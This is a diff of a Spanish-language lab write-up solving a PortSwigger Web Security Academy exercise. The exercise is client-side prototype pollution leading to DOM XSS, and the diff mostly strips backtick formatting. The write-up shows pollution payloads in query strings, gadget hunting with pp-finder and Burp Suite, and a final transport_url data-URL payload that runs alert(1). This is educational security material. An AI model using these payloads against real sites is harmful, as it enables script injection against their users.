@@ -24,27 +24,27 @@ image:
   
 ## Descripción
 
-Este `laboratorio` es `vulnerable` a `DOM XSS` a `través` de `un prototype pollution del lado del cliente`. Para `resolver` el `laboratorio` debemos `encontrar una fuente que podamos usar para añadir propiedades arbitrarias al prototipo global Object.prototype`, `identificar una gadget que nos permita ejecutar código JavaScript arbitrario` y `combinar estas dos cosas para ejecutar alert()`
+Este laboratorio es vulnerable a DOM XSS a `través de un prototype pollution del lado del cliente`. Para resolver el laboratorio debemos `encontrar una fuente que podamos usar para añadir propiedades arbitrarias al prototipo global Object.prototype`, `identificar una gadget que nos permita ejecutar código JavaScript arbitrario y combinar estas dos cosas para ejecutar alert()`
 
 ---
 
 ## Resolución
 
-Al `acceder` a la `web` vemos `esto`
+Al acceder a la web vemos esto
 
 ![](/assets/img/Prototype-Pollution-Lab-3/image_1.png)
 
-Lo `primero` que vamos a hacer es `intentar inyectar una propiedad arbitraria a través de la cadena de consulta`
+Lo primero que vamos a hacer es `intentar inyectar una propiedad arbitraria a través de la cadena de consulta`
 
 ```
 https://0aeb0038032f073c815612f4002600ff.web-security-academy.net/?__proto__[foo]=bar
 ```
 
-Lo siguiente que vamos a hacer es `abrirnos la consola del navegador` e `inspeccionar el Object.prototype para ver si lo hemos contaminado correctamente con la propiedad arbitraria`. Como podemos ver, `no hemos conseguido contaminar la propiedad`
+Lo siguiente que vamos a hacer es abrirnos la consola del navegador e `inspeccionar el Object.prototype para ver si lo hemos contaminado correctamente con la propiedad arbitraria`. Como podemos ver, no hemos conseguido contaminar la propiedad
 
 ![](/assets/img/Prototype-Pollution-Lab-3/image_2.png)
 
-No pasa nada si esto pasa, ya que `hay diferentes formas de contaminar el prototipo`. `He probado esta forma alternativa de contaminar el prototipo, y ha funcionado`
+No pasa nada si esto pasa, ya que hay diferentes formas de contaminar el prototipo. `He probado esta forma alternativa de contaminar el prototipo, y ha funcionado`
 
 ```
 https://0aeb0038032f073c815612f4002600ff.web-security-academy.net/?__proto__.foo=bar
@@ -52,15 +52,15 @@ https://0aeb0038032f073c815612f4002600ff.web-security-academy.net/?__proto__.foo
 
 ![](/assets/img/Prototype-Pollution-Lab-3/image_3.png)
 
-El siguiente paso es `buscar` un `gadget`, para ello, `abrimos la pestaña Network y filtramos por JS`. En nuestro caso, `solo nos interesan los archivos js que carga el dominio`
+El siguiente paso es buscar un gadget, para ello, `abrimos la pestaña Network y filtramos por JS`. En nuestro caso, solo nos interesan los archivos js que carga el dominio
 
 ![](/assets/img/Prototype-Pollution-Lab-3/image_4.png)
 
-A continuación, nos `abrimos` el `Logger` de `Burspuite` y vemos como se `cargan los archivos js`
+A continuación, nos abrimos el Logger de Burspuite y vemos como se cargan los archivos js
 
 ![](/assets/img/Prototype-Pollution-Lab-3/image_5.png)
 
-El `siguiente paso` que debemos hacer es `descargar estos archivos js` y usar `pp-finder` [https://github.com/yeswehack/pp-finder.git](https://github.com/yeswehack/pp-finder.git) para `detectar posibles gadgets`. Es importante que `los archivos js no contengan comentarios` y que `PPF_WRAPPER_NAME no coincida con el nombre de ninguna variable`, de lo contrario, `obtendremos un error`
+El siguiente paso que debemos hacer es descargar estos archivos js y usar `pp-finder` [https://github.com/yeswehack/pp-finder.git](https://github.com/yeswehack/pp-finder.git) para detectar posibles gadgets. Es importante que los archivos js no contengan comentarios y que `PPF_WRAPPER_NAME no coincida con el nombre de ninguna variable`, de lo contrario, obtendremos un error
 
 ```
 PPF_WRAPPER_NAME="searchLoggerAlternative_js_file" npx pp-finder compile --agent browser searchLoggerAlternative.js -o searchLoggerAlternative_compiled.js
@@ -74,13 +74,13 @@ PPF_WRAPPER_NAME="jquery_parseparams_js_file" npx pp-finder compile --agent brow
 PPF_WRAPPER_NAME="jquery_3-0-0_js_file" npx pp-finder compile --agent browser jquery_3-0-0.js -o jquery_3-0-0_compiled.js
 ```
 
-El `siguiente paso` es `usar este comando sobre todos los archivos js compilados para que cuando nos muestre los gadgets que ha encontrado, sepamos a que archivo js pertenecen`. `Antes de ejecutar este comando es importante que los archivos no tengan en el nombre caracteres que no se puedan usar en nombres de variables, de lo contrario nos dará un error cuando abramos la consola del navegador`
+El siguiente paso es `usar este comando sobre todos los archivos js compilados para que cuando nos muestre los gadgets que ha encontrado, sepamos a que archivo js pertenecen`. `Antes de ejecutar este comando es importante que los archivos no tengan en el nombre caracteres que no se puedan usar en nombres de variables, de lo contrario nos dará un error cuando abramos la consola del navegador`
 
 ```
 for f in *_compiled.js; do NAME=$(basename "$f" _compiled.js); sed -i "s|\`\[%cPP%c\]\[%c\${op}%c\] %c\${JSON.stringify(key \|\| \"_\")}%cat \${path} \${loc}\`|\`\[$NAME\]\[%cPP%c\]\[%c\${op}%c\] %c\${JSON.stringify(key \|\| \"_\")}%cat \${path} \${loc}\`|g" "$f"; done
 ```
 
-También tenemos que `ejecutar este comando`, para que `además de mostrarse en la consola del navegador los gadgets encontrados, nos los guarde en un archivo`
+También tenemos que ejecutar este comando, para que `además de mostrarse en la consola del navegador los gadgets encontrados, nos los guarde en un archivo`
 
 ```
 sed -i 's/console\.log(\.\.\.format(arg));/const formatted = format(arg); console.log(...formatted); fetch("http:\/\/localhost:9090\/log", {method:"POST",headers:{"Content-Type":"text\/plain"},body:formatted[0].replace(\/%c\/g,"")}).catch(()=>{});/' *_compiled.js
@@ -135,17 +135,17 @@ class Handler(BaseHTTPRequestHandler):
 HTTPServer(("localhost", 9090), Handler).serve_forever()
 ```
 
-`Ejecutamos` el `script`
+Ejecutamos el script
 
 ```
 python server.py
 ```
 
-Una vez tenemos estos archivos tenemos que `dirigirnos` a `Burpsuite > Proxy settings` y `habilitar` la `checkbox` que dice `Intercept responses based on the following rules`
+Una vez tenemos estos archivos tenemos que dirigirnos a `Burpsuite > Proxy settings y habilitar la checkbox que dice Intercept responses based on the following rules`
 
 ![](/assets/img/Prototype-Pollution-Lab-3/image_6.png)
 
-Lo `siguiente` que vamos a hacer es `crear una regex para aplicar estas sustituciones`. En nuestro caso `los archivos js están en el body de la response, por lo que debemos seleccionar la opción Response body`
+Lo siguiente que vamos a hacer es crear una regex para aplicar estas sustituciones. En nuestro caso `los archivos js están en el body de la response, por lo que debemos seleccionar la opción Response body`
 
 ```
 <script src='/resources/js/jquery_3-0-0.js'></script>
@@ -181,7 +181,7 @@ Una vez hecho esto, `tunelizamos el tráfico del navegador a través del proxy p
 
 ![](/assets/img/Prototype-Pollution-Lab-3/image_10.png)
 
-Lo `siguiente` que debemos de hacer es `desactivar` el `Match and replace` de `Burpsuite`, `abrir la web en una nueva pestaña`, `abrir la consola de desarrollador` y `dirigirnos a aquí`
+Lo siguiente que debemos de hacer es desactivar el Match and replace de Burpsuite, `abrir la web en una nueva pestaña`, abrir la consola de desarrollador y `dirigirnos a aquí`
 
 ![](/assets/img/Prototype-Pollution-Lab-3/image_11.png)
 
@@ -193,11 +193,11 @@ Esto nos lleva a esta `línea`
 
 ![](/assets/img/Prototype-Pollution-Lab-3/image_13.png)
 
-Si `añadimos` un `breakpoint` en la `línea 15`, `hacemos` una `petición` a esta URL `https://0a3600eb0307235780e90d3000870074.web-security-academy.net/?\_\_proto\_\_.sequence=bar` y `hacemos hover sobre sequence`, `vemos que el valor que hemos inyectado ha llegado correctamente a la propiedad sequence 
+Si `añadimos un breakpoint en la línea 15`, hacemos una `petición a esta URL https://0a3600eb0307235780e90d3000870074.web-security-academy.net/?\_\_proto\_\_.sequence=bar y hacemos hover sobre sequence`, `vemos que el valor que hemos inyectado ha llegado correctamente a la propiedad sequence 
 
 ![](/assets/img/Prototype-Pollution-Lab-3/image_14.png)
 
-Si `quitamos` el `breakpoint` y `recargamos la web`, vemos que nos reporta un error en la consola
+Si quitamos el breakpoint y recargamos la web, vemos que nos reporta un error en la consola
 
 ![](/assets/img/Prototype-Pollution-Lab-3/image_15.png)
 
@@ -217,6 +217,6 @@ Una vez sabemos esto ya podemos ejecutar un XSS, Para ello vamos a usar este pay
 
 ![](/assets/img/Prototype-Pollution-Lab-3/image_19.png)
 
-En nuestro caso es mejor `usar` una `data URL` porque `no tenemos Exploit server en este laboratorio`. Para `ejecutar` nuestro `payload malicioso` vamos a `realizar` una `petición` a `https://0a3600eb0307235780e90d3000870074.web-security-academy.net/?\_\_proto\_\_[transport_url]=data:text/javascript,alert(1)`
+En nuestro caso es mejor usar una data URL porque no tenemos Exploit server en este laboratorio. Para ejecutar nuestro payload malicioso vamos a realizar una `petición a https://0a3600eb0307235780e90d3000870074.web-security-academy.net/?\_\_proto\_\_[transport_url]=data:text/javascript,alert(1)`
 
 ![](/assets/img/Prototype-Pollution-Lab-3/image_20.png)
